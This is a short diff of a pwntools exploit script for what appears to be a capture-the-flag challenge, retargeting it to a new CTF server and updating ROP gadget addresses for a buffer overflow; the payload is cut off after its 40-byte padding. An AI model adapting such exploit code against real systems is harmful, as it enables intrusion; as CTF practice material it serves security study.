@@ -1,10 +1,10 @@
 from pwn import *
 
-target = remote("pwn.katagaitai-ctf.com", 9012)
+target = remote("pwn-study.katagaitai-ctf.com", 9020)
 
-win_3 = 0x401531
-pop_rdi = 0x401693
-gets_plt = 0x401080
+win_3 = 0x40154d
+pop_rdi = 0x4016c3
+gets_plt = 0x401090
 bss_writable = 0x404200
 
 payload = b"A" * 40
